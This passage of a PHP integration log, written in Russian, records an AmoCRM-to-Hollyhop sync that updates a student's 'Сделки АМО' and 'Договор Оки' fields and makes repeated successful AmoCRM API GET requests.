    "new_link_url": "https://directorchinatutorru.amocrm.ru/leads/detail/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:01] [INFO] [index.php] Ссылка уже существует в поле
{
    "existing_url": "https://directorchinatutorru.amocrm.ru/leads/detail/29382117",
    "new_url": "https://directorchinatutorru.amocrm.ru/leads/detail/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:01] [INFO] [index.php] Ссылка уже существует в поле, оставляем без изменений
{
    "final_value_preview": "<a href=\"https://directorchinatutorru.amocrm.ru/leads/detail/29382117\" target=\"_blank\">Юлия: 29382117</a>"
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:01] [INFO] [index.php] Добавляем поле Договор Оки
{
    "clientId": 4044,
    "contract_link": "httpss:://lev-tgr.ru"
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:01] [INFO] [index.php] Подготовка к обновлению через EditUserExtraFields
{
    "clientId": 4044,
    "total_fields_to_send": 2,
    "all_fields_names": [
        "Сделки АМО",
        "Договор Оки"
    ]
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:01] [INFO] [index.php] Отправка запроса EditUserExtraFields
{
    "studentClientId": 4044,
    "fields_count": 2,
    "amo_deals_in_fields": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:01] [INFO] [index.php] EditUserExtraFields выполнен успешно
{
    "result_preview": "[]"
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:01] [INFO] [index.php] Поле 'Сделки АМО' обновлено в Hollyhop
{
    "clientId": 4044,
    "lead_id": 29382117,
    "amo_deal_link": "<a href=\"https://directorchinatutorru.amocrm.ru/leads/detail/29382117\" target=\"_blank\">Юлия: 29382117</a>",
    "method": "EditUserExtraFields",
    "total_fields_updated": 2
}
--------------------------------------------------------------------------------
[2026-02-11 22:48:36] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/catalogs/13127/elements/718727"
}
--------------------------------------------------------------------------------
[2026-02-11 22:48:36] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/leads?limit=250&page=1&filter[created_at][from]=1755287316&order[created_at]=desc"
}
--------------------------------------------------------------------------------
[2026-02-11 22:48:37] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/leads/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:48:39] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/catalogs/13127/elements/718727"
}
--------------------------------------------------------------------------------
[2026-02-11 22:48:40] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/leads?limit=250&page=1&filter[created_at][from]=1755287319&order[created_at]=desc"
}
--------------------------------------------------------------------------------
[2026-02-11 22:48:40] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/leads/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:54:52] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/catalogs/13127/elements/718727"
}
--------------------------------------------------------------------------------
[2026-02-11 22:54:53] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/leads?limit=250&page=1&filter[created_at][from]=1755287692&order[created_at]=desc"
}
--------------------------------------------------------------------------------
[2026-02-11 22:54:53] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/leads/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:54:57] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/catalogs/13127/elements/718727"
}
--------------------------------------------------------------------------------
[2026-02-11 22:54:57] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/leads?limit=250&page=1&filter[created_at][from]=1755287697&order[created_at]=desc"
}
--------------------------------------------------------------------------------
[2026-02-11 22:54:58] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/leads/29382117"
}
--------------------------------------------------------------------------------
